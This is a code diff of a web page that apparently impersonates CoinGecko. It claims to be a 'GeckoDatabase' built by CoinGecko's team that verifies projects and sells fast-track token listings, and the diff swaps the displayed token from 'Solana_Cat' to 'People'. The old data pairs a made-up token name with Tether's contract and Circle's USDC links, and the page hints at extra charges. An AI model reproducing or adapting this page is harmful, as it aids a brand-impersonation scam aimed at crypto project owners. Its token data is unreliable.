@@ -70,8 +70,8 @@ const submit = ()=>{
   Verify your project Details directly form the CoinGecko Database
 </p>
 <div className='uppercase flex gap-2 app items-center text-sm md:text-lg font-bold text-[#C0E48B] mt-10'>
-<img className='md:w-[2%] w-[7%]' src="" alt="" />
-<p>SOLANA CAT</p>
+<img className='md:w-[2%] w-[7%] rounded-full' src="../1x/ppl.jpeg" alt="" />
+<p>PEOPLE</p>
 </div>
 
 <div className='p-2 app bg-[#000000] mt-2 md:mt-5'>
@@ -85,20 +85,20 @@ Database_file
 </p>
 <p className='mt-3 text-[#FD5370]'>project_data:[
   <div className='my-1 pl-2 text-[#b79761]'>
-  <p>"listing_id": <span className='text-[#CFADE8]'>"CL0907240005",</span></p>
+  <p>"listing_id": <span className='text-[#CFADE8]'>"CL1507240051",</span></p>
   <p>"type": <span className='text-[#CFADE8]'>"token",</span></p>
   <p className='mt-1 text-[#FD5370]'>"attributes": <span className='text-[#CFADE8]'>[
     <div className='text-[#b79761] py-1'>
-    <p>"name": <span className='text-[#CFADE8]'>"Solana_Cat",</span></p>
-    <p>"symbol": <span className='text-[#CFADE8]'>"SOLC",</span></p>
-    <p>"chain": <span className='text-[#CFADE8]'>"solana",</span></p>
-    <p>"contract_address": <span className='text-[#CFADE8]'>"0xdac17f958d2ee523a2206206994597c13d831ec7",</span></p>
-    <p>"decmials": <span className='text-[#CFADE8]'>"6",</span></p>
-    <p>"image_url": <span className='text-[#CFADE8]'>"https://assets.coingecko.com/coins/images/325/small/Tether.png?1696501661",</span></p>
-    <p>"total_supply": <span className='text-[#CFADE8]'>"10000000000",</span></p>
-    <p>"liquidity": <span className='text-[#CFADE8]'>"10000000000",</span></p>
-    <p>"volume_24h": <span className='text-[#CFADE8]'>"10000000000",</span></p>
-    <p>"price_usd": <span className='text-[#CFADE8]'>"0.99720157",</span></p>
+    <p>"name": <span className='text-[#CFADE8]'>"People",</span></p>
+    <p>"symbol": <span className='text-[#CFADE8]'>"PEOPLE",</span></p>
+    <p>"chain": <span className='text-[#CFADE8]'>"bnb",</span></p>
+    <p>"contract_address": <span className='text-[#CFADE8]'>"0xEa2F49A2e6E27b7B47cBEf50AFf5Af11350108D1",</span></p>
+    <p>"decimals": <span className='text-[#CFADE8]'>"18",</span></p>
+    <p>"image_url": <span className='text-[#CFADE8]'>"https://storage.googleapis.com/coinsniper-assets/images/6oAcJxhQgSj4qc6p3v9LNDPhdzVjI93g6hVvv8yP.png",</span></p>
+    <p>"total_supply": <span className='text-[#CFADE8]'>"500000000000",</span></p>
+    <p>"liquidity": <span className='text-[#CFADE8]'>"225042",</span></p>
+    <p>"volume_24h": <span className='text-[#CFADE8]'>"316048",</span></p>
+    <p>"price_usd": <span className='text-[#CFADE8]'>"0.000003171",</span></p>
     </div>
     ],</span></p>
 
@@ -109,20 +109,20 @@ Database_file
 <div className=' p-2 md:pt-2 pt-0 overflow-scroll app bg-[#000000] md:mt-2 lll'>
 <p className='text-[#FD5370]'>"description": <span className='text-[#CFADE8]'>[
   <div className='my-1 pl-2 text-[#b79761]'>
-  <p>"en": <span className='text-[#CFADE8]'>"solana_cat",</span></p>
-  <p>"de": <span className='text-[#CFADE8]'>"token",</span></p>
+  <p>"en": <span className='text-[#CFADE8]'>"People is a community-owned project on BSC.",</span></p>
+  <p>"de": <span className='text-[#CFADE8]'>"",</span></p>
   </div>
  ],</span>
   <p className='mt-1 text-[#FD5370]'>"links": <span className='text-[#CFADE8]'>[
     <div className='text-[#b79761] py-1'>
-    <p>"website": <span className='text-[#CFADE8]'>"https://www.circle.com/en/usdc",</span></p>
-    <p>"whitepaper": <span className='text-[#CFADE8]'>"https://www.circle.com/en/usdc",</span></p>
-    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://bscscan.com/token/0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",</span></p>
-    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/invite/buildoncircle",</span></p>
-    <p>"twitter_url": <span className='text-[#CFADE8]'>"circle",</span></p>
-    <p>"exchange_url": <span className='text-[#CFADE8]'>"mexc.com/solanacat",</span></p>
+    <p>"website": <span className='text-[#CFADE8]'>"https://peopletoken.xyz",</span></p>
+    <p>"whitepaper": <span className='text-[#CFADE8]'>"https://docs.peopletoken.xyz",</span></p>
+    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://bscscan.com/token/0xEa2F49A2e6E27b7B47cBEf50AFf5Af11350108D1",</span></p>
+    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/peoplechx",</span></p>
+    <p>"twitter_url": <span className='text-[#CFADE8]'>"chttps://x.com/people0x",</span></p>
+    <p>"exchange_url": <span className='text-[#CFADE8]'>"https://pancakeswap.finance/swap?outputCurrency=0xEa2F49A2e6E27b7B47cBEf50AFf5Af11350108D1&inputCurrency=BNB",</span></p>
    
-    <p className='text-[#b79761]'>"geckoterminal_url": <span className='text-[#CFADE8]'>"https://www.geckoterminal.com/ton/pools/EQDliYkW-Ryo0CEPpThzxbHT97Niu9BOHLwidsofCj6Qv870",</span></p>
+    <p className='text-[#b79761]'>"geckoterminal_url": <span className='text-[#CFADE8]'>"https://www.geckoterminal.com/bsc/pools/0xfb2a1323445cd8a3e871f76147ca9828cb372cab",</span></p>
     <p className='text-[#b79761]'>"listing_mode": <span className='text-[#CFADE8]'>"database",</span></p>
     </div>
       ],</span></p> ].</p>
@@ -154,9 +154,8 @@ Please ensure that all details are accurately implemented to avoid additional ch
     <div className='md:flex p-5  '>
 <section className='md:w-[60%] app '>
 <img src="../1x/Asset 7.png" alt="" className='md:w-[30%] w-[70%]'/>
-<p className='mt-5 text-xs'>GeckoTerminal is the most comprehensive real-time DEX tracker, 
-  built by the team behind CoinGecko. Monitor crypto prices, volume, transactions,
-   liquidity, and more on decentralized exchanges across all blockchains.</p>
+<p className='mt-5 text-xs'>GeckoDatabase is the most fastest and comprehensive real-time DEX tracker, 
+  built by the team behind CoinGecko. Helping crypto projects with fast track listings, tokens updates for any project and more on decentralized exchanges across all blockchains.</p>
 </section>
 <section className='md:w-[20%]'>
   <p className='font-bold md:mb-3 mb-2 md:mt-0 mt-5'>Resources</p>
